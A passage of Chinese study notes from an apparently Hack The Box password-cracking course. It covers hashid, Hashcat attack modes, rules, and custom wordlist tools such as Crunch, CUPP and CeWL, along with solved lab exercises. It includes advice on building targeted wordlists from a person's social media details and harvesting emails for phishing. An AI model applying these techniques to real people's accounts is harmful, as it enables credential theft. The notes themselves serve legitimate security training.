散列</p><p>$6$vb1tLY1qiY$M.1ZCqKtJBxBtZm1gRi8Bkn39KU0YJW1cuMFzTRANcNKFKR4RmAQVk4rqQQCkaJT6wXqjUkFca&#x2F;qNxLyqW.U&#x2F;</p><p>包含三个由$分隔的字段，其中第一个字段是id，即6。这用于识别用于哈希的算法的类型。以下列表包含一些ID及其相应的算法。</p><pre><code class="shell-session">$1$  : MD5$2a$ : Blowfish$2y$ : Blowfish, with correct handling of 8 bit characters$5$  : SHA256$6$  : SHA512</code></pre><h2 id="Hashid"><a href="#Hashid" class="headerlink" title="Hashid"></a>Hashid</h2><p>Hashid是一个Python工具，可以用来检测各种哈希。在撰写本文时，哈希可以用于识别200多种独特的哈希类型，对于其他类型，它将尽最大努力进行猜测，这仍然需要一些额外的工作来缩小范围。支持的哈希的完整列表可以在这里找到。它可以使用pip进行安装。</p><p>哈希可以作为命令行参数或使用文件提供。</p><pre><code class="shell-session">Tanin@htb[/htb]$ hashid &#39;$apr1$71850310$gh9m4xcAn3MGxogwX/ztb.&#39;Analyzing &#39;$apr1$71850310$gh9m4xcAn3MGxogwX/ztb.&#39;[+] MD5(APR) [+] Apache MD5</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ hashid hashes.txt --File &#39;hashes.txt&#39;--Analyzing &#39;2fc5a684737ce1bf7b3b239df432416e0dd07357:2014&#39;[+] SHA-1 [+] Double SHA-1 [+] RIPEMD-160 [+] Haval-160 [+] Tiger-160 [+] HAS-160 [+] LinkedIn [+] Skein-256(160) [+] Skein-512(160) [+] Redmine Project Management Web App [+] SMF ≥ v1.1 Analyzing &#39;$P$984478476IagS59wHZvyQMArzfx58u.&#39;[+] Wordpress ≥ v2.6.2 [+] Joomla ≥ v2.5.18 [+] PHPass&#39; Portable Hash --End of file &#39;hashes.txt&#39;--</code></pre><p>如果已知，hashid还可以为相应的Hashcat哈希模式提供-m标志，前提是它能够确定哈希类型。</p><pre><code class="shell-session">Tanin@htb[/htb]$ hashid &#39;$DCC2$10240#tom#e4e938d12fe5974dc42a90120bd9c90f&#39; -mAnalyzing &#39;$DCC2$10240#tom#e4e938d12fe5974dc42a90120bd9c90f&#39;[+] Domain Cached Credentials 2 [Hashcat Mode: 2100</code></pre><p>&#x3D;&#x3D;&gt;Hashcat Mode: 2100</p><h2 id="Context-is-Important"><a href="#Context-is-Important" class="headerlink" title="Context is Important"></a>Context is Important</h2><p>并不总是能够基于所获得的散列来识别算法。根据软件的不同，明文可能会经历多次加密和盐析转换，从而使其更难恢复。 需要注意的是，hashid使用regex来尽最大努力确定所提供的哈希类型。通常，哈希会为给定的哈希提供许多可能性，而我们仍然会留下一定数量的猜测来识别给定的哈希。这可能发生在CTF期间，但我们通常有一些关于在渗透测试期间要识别的哈希类型的上下文。它是通过Active Directory攻击还是从Windows主机获得的？它是通过成功利用SQL注入漏洞获得的吗？了解哈希的来源将极大地帮助我们缩小哈希类型的范围，从而缩小尝试破解它所需的Hashcat哈希模式。Hashcat提供了一个很好的参考，它将哈希模式映射到示例哈希。在渗透测试期间，这个参考是非常宝贵的，以确定我们正在处理的哈希类型以及将其传递给Hashcat所需的相关哈希模式。 例如，传递散列a2d1f7b7a1862d0d4a52644e72d59df5:500：<a href="mailto:&#x6c;&#112;&#x40;&#x74;&#114;&#x61;&#115;&#x68;&#45;&#x6d;&#97;&#105;&#x6c;&#x2e;&#99;&#111;&#109;">&#x6c;&#112;&#x40;&#x74;&#114;&#x61;&#115;&#x68;&#45;&#x6d;&#97;&#105;&#x6c;&#x2e;&#99;&#111;&#109;</a>哈希将给我们带来各种可能性：</p><h2 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h2><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -hhashcat (v6.1.1) starting...Usage: hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...- [ Options ] - Options Short / Long           | Type | Description                                          | Example================================+======+======================================================+======================= -m, --hash-type                | Num  | Hash-type, see references below                      | -m 1000 -a, --attack-mode              | Num  | Attack-mode, see references below                    | -a 3 -V, --version                  |      | Print version                                        | -h, --help                     |      | Print help                                           |     --quiet                    |      | Suppress output                                      |     --hex-charset              |      | Assume charset is given in hex                       |     --hex-salt                 |      | Assume salt is given in hex                          |     --hex-wordlist             |      | Assume words in wordlist are given in hex            |     --force                    |      | Ignore warnings                                      |     --status                   |      | Enable automatic update of the status screen         |     --status-json              |      | Enable JSON format for status output                 |     --status-timer             | Num  | Sets seconds between status screen updates to X      | --status-timer=1     --stdin-timeout-abort      | Num  | Abort if there is no input from stdin for X seconds  | --stdin-timeout-abort=300     --machine-readable         |      | Display the status view in a machine-readable format |&lt;SNIP&gt;</code></pre><p>-a和-m参数用于指定攻击模式的类型和哈希类型。Hashcat支持以下攻击模式：</p><table><thead><tr><th><strong>#</strong></th><th><strong>Mode</strong></th></tr></thead><tbody><tr><td>0</td><td>Straight</td></tr><tr><td>1</td><td>Combination</td></tr><tr><td>3</td><td>Brute-force</td></tr><tr><td>6</td><td>Hybrid Wordlist + Mask</td></tr><tr><td>7</td><td>Hybrid Mask + Wordlist</td></tr></tbody></table><p>哈希类型值基于要破解的哈希的算法。这里可以找到哈希类型的完整列表及其相应的示例。该表有助于快速识别给定哈希类型的数字。您还可以使用以下命令通过命令行查看示例哈希列表：</p><h4 id="Hashcat-Example-Hashes"><a href="#Hashcat-Example-Hashes" class="headerlink" title="Hashcat - Example Hashes"></a>Hashcat - Example Hashes</h4><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat --example-hashes | lesshashcat (v6.1.1) starting...MODE: 0TYPE: MD5HASH: 8743b52063cd84097a65d1633f5c74f5PASS: hashcatMODE: 10TYPE: md5($pass.$salt)HASH: 3d83c8e717ff0e7ecfe187f088d69954:343141PASS: hashcatMODE: 11TYPE: Joomla &lt; 2.5.18HASH: b78f863f2c67410c41e617f724e22f34:89384528665349271307465505333378PASS: hashcatMODE: 12TYPE: PostgreSQLHASH: 93a8cf6a7d43e3b5bcd2dc6abb3e02c6:27032153220030464358344758762807PASS: hashcatMODE: 20TYPE: md5($salt.$pass)HASH: 57ab8499d08c59a7211c77f557bf9425:4247PASS: hashcat&lt;SNIP&gt;</code></pre><p>您可以滚动浏览列表，然后按q退出。 可以使用-b标志来执行特定哈希类型的基准测试（或性能测试）。</p><h4 id="Hashcat-Benchmark"><a href="#Hashcat-Benchmark" class="headerlink" title="Hashcat - Benchmark"></a>Hashcat - Benchmark</h4><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -b -m 0hashcat (v6.1.1) starting in benchmark mode...Benchmarking uses hand-optimized kernel code by default.You can use it in your cracking session by setting the -O option.Note: Using optimized kernel code limits the maximum supported password length.To disable the optimized kernel code in benchmark mode, use the -w option.OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]=============================================================================================================================* Device #1: pthread-Intel(R) Core(TM) i7-5820K CPU @ 3.30GHz, 4377/4441 MB (2048 MB allocatable), 6MCUBenchmark relevant options:===========================* --optimized-kernel-enableHashmode: 0 - MD5Speed.#1.........:   449.4 MH/s (12.84ms) @ Accel:1024 Loops:1024 Thr:1 Vec:8Started: Fri Aug 28 21:52:35 2020Stopped: Fri Aug 28 21:53:25 2020</code></pre><h4 id="Hashcat-Optimizations"><a href="#Hashcat-Optimizations" class="headerlink" title="Hashcat - Optimizations"></a>Hashcat - Optimizations</h4><p>Hashcat有两种优化速度的主要方法：</p><table><thead><tr><th>Option</th><th>Description</th></tr></thead><tbody><tr><td>Optimized Kernels</td><td>This is the <code>-O</code> flag, which according to the documentation, means <code>Enable optimized kernels (limits password length)</code>. The magical password length number is generally 32, with most wordlists won’t even hit that number. This can take the estimated time from days to hours, so it is always recommended to run with <code>-O</code> first and then rerun after without the <code>-O</code> if your GPU is idle.</td></tr><tr><td>Workload</td><td>This is the <code>-w</code> flag, which, according to the documentation, means <code>Enable a specific workload profile</code>. The default number is <code>2</code>, but if you want to use your computer while Hashcat is running, set this to <code>1</code>. If you plan on the computer only running Hashcat, this can be set to <code>3</code>.</td></tr></tbody></table><h2 id="Straight-or-Dictionary-Attack"><a href="#Straight-or-Dictionary-Attack" class="headerlink" title="Straight or Dictionary Attack"></a>Straight or Dictionary Attack</h2><p>顾名思义，这种攻击从单词列表中读取，并试图破解提供的哈希。如果你知道目标组织使用弱密码，或者只是想很快完成一些破解尝试，那么字典攻击是有用的。这种攻击通常比本模块后面讨论的更复杂的攻击完成得更快。它的基本语法是：</p><h2 id="Straight-or-Dictionary-Attack-1"><a href="#Straight-or-Dictionary-Attack-1" class="headerlink" title="Straight or Dictionary Attack"></a>Straight or Dictionary Attack</h2><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -a 0 -m &lt;hash type&gt; &lt;hash file&gt; &lt;wordlist&gt;</code></pre><p>例如，以下命令将使用rockyou.txt单词列表破解SHA256哈希。</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo -n &#39;!academy&#39; | sha256sum | cut -f1 -d&#39; &#39; &gt; sha256_hash_exampleTanin@htb[/htb]$ hashcat -a 0 -m 1400 sha256_hash_example /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txthashcat (v6.1.1) starting...</code></pre><p>在上面的例子中，散列在4秒内被破解。破解速度因底层硬件、哈希类型和密码的复杂性而异。 让我们来看一个更复杂的散列，例如Bcrypt，它是一种基于Blowfish密码的密码散列。它利用salt来保护它免受彩虹表攻击，并且可以应用多轮算法，使哈希即使使用大型密码破解设备也能抵抗暴力攻击。 例如，以相同密码“！academy”的bcrypt哈希为例，该哈希为<code>$2a$05$ZdEkj8cup/JycBRn2CX.B.nIceCYR8GbPbCCg6RlD7uvuREexEbVy</code>，并应用了5轮Blowfish算法。在具有相同单词列表的相同硬件上运行此哈希需要相当长的时间才能破解。 在破解过程中的任何时候，你都可以点击“s”键来获得破解作业的状态，这表明尝试rockyou.txt单词列表中的每个密码需要1.5个多小时。应用更多轮的算法将成倍地增加破解时间。在使用bcrypt等哈希的情况下，通常最好使用更小、更有针对性的单词列表。</p><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><blockquote><p>Crack the following hash using the rockyou.txt wordlist: <code>0c352d5b2f45217c57bef9f8452ce376</code></p></blockquote><p>先用hashid分析一下类型：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307121635544.png" alt="image-20230712163503479"></p><p>这里得到很多种结果，好像只能依次测试一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307121705997.png" alt="image-20230712170530904"></p><p>第一次就成功了hh</p><h1 id="Combination-Attack"><a href="#Combination-Attack" class="headerlink" title="Combination Attack"></a>Combination Attack</h1><p>组合攻击模式采用两个单词列表作为输入，并从中创建组合。这种攻击很有用，因为用户将两个或多个单词连接在一起并不罕见，他们认为这会创建一个更强的密码，即welcomehome或hotelcalifornia。 </p><p>要演示此攻击，请考虑以下单词列表：</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat wordlist1superworldsecret</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ cat wordlist1superworldsecret</code></pre><p>如果给定这两个单词列表，Hashcat将恰好产生3 x 2&#x3D;6个单词，例如：</p><pre><code class="shell-session">Tanin@htb[/htb]$ awk &#39;(NR==FNR) &#123; a[NR]=$0 &#125; (NR != FNR) &#123; for (i in a) &#123; print $0 a[i] &#125; &#125;&#39; file2 file1superhellosuperpasswordworldhellowordpasswordsecrethellosecretpassword</code></pre><p>这也可以通过Hashcat使用–stdout标志来完成，这对于调试和查看工具是如何处理事情非常有帮助。 在下面的例子中，我们可以看到给定相同的两个文件，Hashcat将产生什么：</p><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -a 1 --stdout file1 file2superhellosuperpasswordworldhelloworldpasswordsecrethellosecretpassword</code></pre><h4 id="Hashcat-Syntax"><a href="#Hashcat-Syntax" class="headerlink" title="Hashcat - Syntax"></a>Hashcat - Syntax</h4><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -a 1 -m &lt;hash type&gt; &lt;hash file&gt; &lt;wordlist1&gt; &lt;wordlist2&gt;</code></pre><p>这种攻击在使用单词列表时提供了更多的灵活性和自定义功能。</p><h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><blockquote><p>使用Hashcat组合攻击查找以下md5哈希的明文密码：19672a3f042ae1b592289f8333bf76c5。使用本节末尾显示的补充单词表。</p></blockquote><pre><code>hashid 19672a3f042ae1b592289f8333bf76c5 -mAnalyzing &#39;19672a3f042ae1b592289f8333bf76c5&#39;[+] MD2 [+] MD5 [Hashcat Mode: 0][+] MD4 [Hashcat Mode: 900][+] Double MD5 [Hashcat Mode: 2600][+] LM [Hashcat Mode: 3000][+] RIPEMD-128 [+] Haval-128 [+] Tiger-128 [+] Skein-256(128) [+] Skein-512(128) [+] Lotus Notes/Domino 5 [Hashcat Mode: 8600][+] Skype [Hashcat Mode: 23][+] Snefru-128 [+] NTLM [Hashcat Mode: 1000][+] Domain Cached Credentials [Hashcat Mode: 1100][+] Domain Cached Credentials 2 [Hashcat Mode: 2100][+] DNSSEC(NSEC3) [Hashcat Mode: 8300][+] RAdmin v2.x [Hashcat Mode: 9900]</code></pre><pre><code>hashcat -a 1 -m 0 19672a3f042ae1b592289f8333bf76c5 file1.txt file2.txt hashcat (v6.2.6) starting    &lt;--snip--&gt;    19672a3f042ae1b592289f8333bf76c5:frozenapple  </code></pre><h1 id="Mask-Attack"><a href="#Mask-Attack" class="headerlink" title="Mask Attack"></a>Mask Attack</h1><p>掩码攻击用于生成与特定模式匹配的单词。当密码长度或格式已知时，这种类型的攻击尤其有用。可以使用静态字符、字符范围（例如[A-z]或[A-z-9]）或占位符创建掩码。以下列表显示了一些重要的占位符：</p><table><thead><tr><th><strong>Placeholder</strong></th><th><strong>Meaning</strong></th></tr></thead><tbody><tr><td>?l</td><td>lower-case ASCII letters (a-z)</td></tr><tr><td>?u</td><td>upper-case ASCII letters (A-Z)</td></tr><tr><td>?d</td><td>digits (0-9)</td></tr><tr><td>?h</td><td>0123456789abcdef</td></tr><tr><td>?H</td><td>0123456789ABCDEF</td></tr><tr><td>?s</td><td>special characters («space»!”#$%&amp;’()*+,-.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;{</td></tr><tr><td>?a</td><td>?l?u?d?s</td></tr><tr><td>?b</td><td>0x00 - 0xff</td></tr></tbody></table><p>以上占位符可以与选项“-1”到“-4”组合使用，这些选项可用于自定义占位符。请参阅此处的 <a href="https://hashcat.net/wiki/doku.php?id=mask_attack">here</a>“自定义字符集”部分，以获取可用于配置四个自定义字符集的这四个命令行参数中每一个的详细细分。 以Inlane Freight公司为例，该公司这次的密码为“ILFREIGHT<userid><year>”，其中userid长5个字符。掩码“ILFREIGHT？l？l？1？l？l20[0-1]？d”可用于以指定模式破解密码，其中“？l”是一个字母，“20[0-1]”将包括2000年至2019年的所有年份。 让我们尝试创建一个散列并使用这个掩码来破解它。</p><h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><blockquote><p>Crack the following MD5 hash using a mask attack: <code>50a742905949102c961929823a2e8ca0</code>. Use the following mask: -1 02 ‘HASHCAT?l?l?l?l?l20?1?d’</p></blockquote><pre><code>hashcat -a 3 -m 0 50a742905949102c961929823a2e8ca0 -1 02 &#39;HASHCAT?l?l?l?l?l20?1?d&#39;hashcat (v6.2.6) starting&lt;snip&gt;50a742905949102c961929823a2e8ca0:HASHCATqrstu2020 </code></pre><p>这里的-1 02是自定义字符集</p><h1 id="Hybrid-Mode"><a href="#Hybrid-Mode" class="headerlink" title="Hybrid Mode"></a>Hybrid Mode</h1><p>混合模式是组合子攻击的一种变体，其中多个模式可以一起用于微调的单词列表创建。此模式可用于通过创建非常自定义的单词列表来执行非常有针对性的攻击。当您知道或大致了解组织的密码策略或通用密码语法时，它尤其有用。混合攻击的攻击模式为“6”。</p><p>让我们考虑一个密码，例如“football1$”。下面的示例显示了如何将单词列表与掩码结合使用。</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo -n &#39;football1$&#39; | md5sum | tr -d &quot; -&quot; &gt; hybrid_hash</code></pre><p>Hashcat从单词列表中读取单词，并根据提供的掩码附加一个唯一的字符串。在这种情况下，掩码“？d？s”告诉hashcat在rockyou.txt单词表中的每个单词的末尾附加一个数字和一个特殊字符。</p><h4 id="Hashcat-Hybrid-Attack-using-Wordlists"><a href="#Hashcat-Hybrid-Attack-using-Wordlists" class="headerlink" title="Hashcat - Hybrid Attack using Wordlists"></a>Hashcat - Hybrid Attack using Wordlists</h4><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -a 6 -m 0 hybrid_hash /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt &#39;?d?s&#39;</code></pre><p>攻击模式“7”可以用于使用给定的掩码在单词前添加字符。以下示例显示了一个掩码，该掩码使用自定义字符集为rockyou.txt单词列表中的每个单词添加前缀。自定义字符掩码“20？1？d”和自定义字符集“-1 01”将为单词表中的每个单词（即2010、2011、2012..）加上不同的年份。</p><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -a 7 -m 0 hybrid_hash_prefix -1 01 &#39;20?1?d&#39; /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code></pre><h2 id="practice-3"><a href="#practice-3" class="headerlink" title="practice"></a>practice</h2><blockquote><p>Crack the following hash: <code>978078e7845f2fb2e20399d9e80475bc1c275e06</code> using the mask ?d?s.</p></blockquote><pre><code>hashcat -a 6 -m 100 978078e7845f2fb2e20399d9e80475bc1c275e06 /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt &#39;?d?s&#39; </code></pre><p>这里需要先判断一下hash类型</p><p>&#x3D;&#x3D;&gt;</p><pre><code>978078e7845f2fb2e20399d9e80475bc1c275e06:hybridmaster9$  </code></pre><h1 id="Creating-Custom-Wordlists"><a href="#Creating-Custom-Wordlists" class="headerlink" title="Creating Custom Wordlists"></a>Creating Custom Wordlists</h1><p>在评估过程中，我们可能会检索到一个或多个对参与成功至关重要的密码哈希。尽管我们尽了最大努力，但使用前面章节中介绍的字典、组合、掩码或混合攻击，这些哈希无法通过常见单词列表破解。在这些情况下，可能有必要创建一个自定义的、有针对性的单词列表来实现我们的目标。 有必要花时间细化单词列表，因为成功率在很大程度上取决于它。单词列表可以从各种来源获得，并根据目标进行定制，然后使用规则进行进一步微调。可以找到密码、用户名、文件名、有效载荷和许多其他数据类型的单词列表。SecLists存储库还包含许多用于用户名枚举密码标识的单词列表。</p><h2 id="Creating-Wordlists"><a href="#Creating-Wordlists" class="headerlink" title="Creating Wordlists"></a>Creating Wordlists</h2><p>许多开源工具有助于根据我们的要求创建定制的密码单词表。</p><h2 id="Crunch"><a href="#Crunch" class="headerlink" title="Crunch"></a>Crunch</h2><p>Crunch可以根据特定长度的单词、有限的字符集或特定模式等参数创建单词列表。它可以生成排列和组合。 它默认安装在Parrot操作系统上，可以在这里找到。crunch的一般语法如下：</p><h4 id="Crunch-Syntax"><a href="#Crunch-Syntax" class="headerlink" title="Crunch - Syntax"></a>Crunch - Syntax</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crunch &lt;minimum length&gt; &lt;maximum length&gt; &lt;charset&gt; -t &lt;pattern&gt; -o &lt;output file&gt;</code></pre><p>“-t”选项用于指定生成密码的模式。该模式可以包含“@”，表示小写字符，“，”（逗号）将插入大写字符，“%”将插入数字，“^”将插入符号。</p><h4 id="Crunch-Generate-Word-List"><a href="#Crunch-Generate-Word-List" class="headerlink" title="Crunch - Generate Word List"></a>Crunch - Generate Word List</h4><pre><code class="shell-session">Tanin@htb[/htb]$ crunch 4 8 -o wordlist</code></pre><p>上面的命令使用默认字符集创建一个由长度为4到8个字符的单词组成的单词列表。 假设Inlane Freight用户密码的格式为“ILFREIGHTYYYXXXX”，其中“XXXX”是包含字母的员工ID，“YYYY”是年份。我们可以使用crunch创建一个这样的密码列表。</p><pre><code class="shell-session">Tanin@htb[/htb]$ crunch 17 17 -t ILFREIGHT201%@@@@ -o wordlist</code></pre><p>如果我们知道用户的出生日期是1998年3月10日（通过社交媒体等），我们可以将其包含在他们的密码中，然后加上一串字母。Crunch可以用来创建这样的单词的单词列表。“-d”选项用于指定重复次数。</p><pre><code class="shell-session">Tanin@htb[/htb]$ crunch 12 12 -t 10031998@@@@ -d 1 -o wordlist</code></pre><h2 id="CUPP"><a href="#CUPP" class="headerlink" title="CUPP"></a>CUPP</h2><p>CUPP代表通用用户密码档案器，用于根据从社会工程和OSINT获得的信息创建高度针对性和定制的单词列表。人们在创建密码时往往会使用个人信息，如电话号码、宠物名称、出生日期等。CUPP会接收这些信息并从中创建密码。这些单词列表主要用于访问社交媒体帐户。CUPP默认安装在Parrot操作系统上，可在此处找到 <a href="https://github.com/Mebus/cupp">here</a>。“-i”选项用于在交互模式下运行，提示CUPP向我们询问有关目标的信息。</p><p>“Leet”模式，该模式使用常用单词中的字母和数字组合。CUPP还可以使用“-l”选项从各种在线数据库中获取通用名称。</p><h2 id="KWPROCESSOR"><a href="#KWPROCESSOR" class="headerlink" title="KWPROCESSOR"></a>KWPROCESSOR</h2><p>Kwprocessor是一个通过键盘漫游创建单词列表的工具。另一种常见的密码生成技术是遵循键盘上的模式。这些密码被称为键盘行走，因为它们看起来像是沿着按键行走。例如，字符串“qwertyasdfg”是通过使用键盘前两行中的前五个字符创建的。这对正常人来说似乎很复杂，但很容易预测。Kwprocessor使用各种算法来猜测这样的模式。 该工具可以在此处找到 <a href="https://github.com/hashcat/kwprocessor">here</a>，必须手动安装。</p><pre><code class="shell-session">Tanin@htb[/htb]$ git clone https://github.com/hashcat/kwprocessorTanin@htb[/htb]$ cd kwprocessorTanin@htb[/htb]$ make</code></pre><p>帮助菜单显示了kwp支持的各种选项。该模式基于用户可以在键盘上选择的地理方向。例如，“–keywalk west”选项用于指定从基本角色向西移动。该程序将基本字符作为参数，这是模式开始时的字符集。接下来，它需要一个键映射，它映射特定语言键盘布局上键的位置。最后一个选项用于指定要使用的路线。路由是一种由密码遵循的模式。它定义了密码的形成方式，从基本字符开始。例如，路线222可以表示从基本字符开始的路径2<em>EAST+2</em>SOUTH+2*WEST。如果基本字符被认为是“T”，那么路由生成的密码将是美国密钥映射上的“TYUJNBV”。有关更多信息，请参阅kwprocessor的自述文件 <a href="https://github.com/hashcat/kwprocessor#routes">README</a> 。</p><h4 id="Kwprocessor-Example"><a href="#Kwprocessor-Example" class="headerlink" title="Kwprocessor - Example"></a>Kwprocessor - Example</h4><pre><code class="shell-session">Tanin@htb[/htb]$ kwp -s 1 basechars/full.base keymaps/en-us.keymap  routes/2-to-10-max-3-direction-changes.route</code></pre><p>上面的命令生成字符可到达的单词，同时按住shift（-s），使用全基、标准en-us键映射和3个方向更改路线。</p><h2 id="CeWL"><a href="#CeWL" class="headerlink" title="CeWL"></a>CeWL</h2><p><a href="https://github.com/digininja/CeWL">CeWL</a>是另一个可用于创建自定义单词列表的工具。它抓取一个网站，并创建一个现有单词列表。这种单词列表是有效的，因为人们倾向于使用与他们所写或操作的内容相关的密码。例如，一个写关于自然、野生动物等博客的博主可能有一个与这些主题相关联的密码。这是由于人性使然，因为这样的密码也很容易记住。组织通常有与其品牌和行业特定词汇相关的密码。例如，网络公司的用户可能拥有由路由器、交换机、服务器等单词组成的密码。这些单词可以在他们的网站上的博客、推荐信和产品描述中找到。</p><h4 id="CeWL-Syntax"><a href="#CeWL-Syntax" class="headerlink" title="CeWL - Syntax"></a>CeWL - Syntax</h4><pre><code class="shell-session">Tanin@htb[/htb]$ cewl -d &lt;depth to spider&gt; -m &lt;minimum word length&gt; -w &lt;output wordlist&gt; &lt;url of website&gt;</code></pre><p>CeWL可以抓取给定网站上的多个页面。输出单词的长度可以使用“-m”参数更改，具体取决于密码要求（即，一些网站的密码长度最小）。 CeWL还支持使用“-e”选项从网站中提取电子邮件。在以后进行网络钓鱼、密码喷洒或暴力强制密码时，获取这些信息很有帮助。</p><p>CeWL - Example</p><pre><code class="shell-session">Tanin@htb[/htb]$ cewl -d 5 -m 8 -e http://inlanefreight.com/blog -w wordlist.txt</code></pre><p>上面的命令从“<a href="http://inlanefreight.com/blog%E2%80%9D%EF%BC%8C%E5%B9%B6%E4%B8%94%E4%BB%85%E5%8C%85%E6%8B%AC%E9%95%BF%E5%BA%A6%E5%A4%A7%E4%BA%8E8%E7%9A%84%E5%8D%95%E8%AF%8D%E3%80%82">http://inlanefreight.com/blog”，并且仅包括长度大于8的单词。</a></p><h2 id="Hashcat-utils"><a href="#Hashcat-utils" class="headerlink" title="Hashcat-utils"></a>Hashcat-utils</h2><p>Hashcat utils  <a href="https://github.com/hashcat/hashcat-utils">repo</a>包含许多实用程序，这些实用程序可用于更高级的密码破解。例如，<a href="https://github.com/hashcat/maskprocessor">maskprocessor</a>工具可以用于使用给定的掩码创建单词列表。此工具的详细用法可在此处<a href="https://hashcat.net/wiki/doku.php?id=maskprocessor">here</a>找到。 例如，maskprocessor可以用于将所有特殊字符附加到单词的末尾：</p><pre><code class="shell-session">Tanin@htb[/htb]$ /mp64.bin Welcome?sWelcome Welcome!Welcome&quot;Welcome#Welcome$Welcome%Welcome&amp;Welcome&#39;Welcome(Welcome)Welcome*Welcome+&lt;SNIP&gt;</code></pre><h1 id="Working-with-Rules"><a href="#Working-with-Rules" class="headerlink" title="Working with Rules"></a>Working with Rules</h1><p>基于规则的攻击是最先进、最复杂的密码破解模式。规则有助于对输入单词列表执行各种操作，如前缀、后缀、大小写切换、剪切、反转等等。规则将基于面具的攻击提升到另一个级别，并提供更高的破解率。此外，规则的使用节省了磁盘空间和由于较大的单词列表而产生的处理时间。 可以使用函数创建规则，这些函数将单词作为输入并输出其修改后的版本。下表描述了一些与JtR以及Hashcat兼容的函数。</p><table><thead><tr><th><strong>Function</strong></th><th><strong>Description</strong></th><th><strong>Input</strong></th><th><strong>Output</strong></th></tr></thead><tbody><tr><td>l</td><td>Convert all letters to lowercase</td><td>InlaneFreight2020</td><td>inlanefreight2020</td></tr><tr><td>u</td><td>Convert all letters to uppercase</td><td>InlaneFreight2020</td><td>INLANEFREIGHT2020</td></tr><tr><td>c &#x2F; C</td><td>capitalize &#x2F; lowercase first letter and invert the rest</td><td>inlaneFreight2020 &#x2F; Inlanefreight2020</td><td>Inlanefreight2020 &#x2F; iNLANEFREIGHT2020</td></tr><tr><td>t &#x2F; TN</td><td>Toggle case : whole word &#x2F; at position N</td><td>InlaneFreight2020</td><td>iNLANEfREIGHT2020</td></tr><tr><td>d &#x2F; q &#x2F; zN &#x2F; ZN</td><td>Duplicate word &#x2F; all characters &#x2F; first character &#x2F; last character</td><td>InlaneFreight2020</td><td>InlaneFreight2020InlaneFreight2020 &#x2F; IInnllaanneeFFrreeiigghhtt22002200 &#x2F; IInlaneFreight2020 &#x2F; InlaneFreight20200</td></tr><tr><td>{ &#x2F; }</td><td>Rotate word left &#x2F; right</td><td>InlaneFreight2020</td><td>nlaneFreight2020I &#x2F; 0InlaneFreight202</td></tr><tr><td>^X &#x2F; $X</td><td>Prepend &#x2F; Append character X</td><td>InlaneFreight2020 (^! &#x2F; $! )</td><td>!InlaneFreight2020 &#x2F; InlaneFreight2020!</td></tr><tr><td>r</td><td>Reverse</td><td>InlaneFreight2020</td><td>0202thgierFenalnI</td></tr></tbody></table><p>函数的完整列表可以在这里找到 <a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack#implemented_compatible_functions">here</a>。有时，输入单词列表包含与我们的目标规范不匹配的单词。例如，公司的密码策略可能不允许用户设置长度小于7个字符的密码。在这种情况下，可以使用拒绝规则来阻止对此类单词的处理。 长度小于N的单词可以用&gt;N拒绝，而长度大于N的单词则可以用&lt;N拒绝。拒绝规则的列表可以在这里找到<a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack#rules_used_to_reject_plains">here</a>。</p><blockquote><p> 注意：拒绝规则只适用于hashcat遗留版本，或者在hashcat中使用-j或-k时使用。它们将不能作为常规规则（在规则文件中）与Hashcat一起工作。</p></blockquote><p>通常的用户行为表明，他们倾向于用类似的数字替换字母，比如“o”可以用“0”替换，或者“i”可以用”1“替换。这通常被称为L33语音，非常有效。公司密码通常以年份为前缀或附加年份。让我们创建一个规则来生成这样的单词。</p><h4 id="Create-a-Rule-File"><a href="#Create-a-Rule-File" class="headerlink" title="Create a Rule File"></a>Create a Rule File</h4><pre><code class="shell-session">Tanin@htb[/htb]$ echo &#39;c so0 si1 se3 ss5 sa@ $2 $0 $1 $9&#39; &gt; rule.txt</code></pre><p>第一个字母的单词用c函数大写。然后规则使用替换函数s将o替换为0，将i替换为1，将e替换为3，将a替换为@。最后，2019年被附加到它后面。将规则复制到一个文件中，以便我们可以调试它。</p><p>可以使用“-r”标志来指定规则，然后使用单词列表来调试规则。</p><pre><code class="shell-session">Tanin@htb[/htb]$ hashcat -r rule.txt test.txt --stdoutP@55w0rd_1lfr31ght2019</code></pre><p>我们能够用我们的自定义规则和rockyou.txt破解哈希。Hashcat支持重复使用-r标志来使用多规则。默认情况下，Hashcat使用各种规则进行。它们可以在规则文件夹中找到。</p><h4 id="Hashcat-Default-Rules"><a href="#Hashcat-Default-Rules" class="headerlink" title="Hashcat - Default Rules"></a>Hashcat - Default Rules</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ls -l /usr/share/hashcat/rules/total 2576-rw-r--r-- 1 root root    933 Jun 19 06:20 best64.rule-rw-r--r-- 1 root root    633 Jun 19 06:20 combinator.rule-rw-r--r-- 1 root root 200188 Jun 19 06:20 d3ad0ne.rule-rw-r--r-- 1 root root 788063 Jun 19 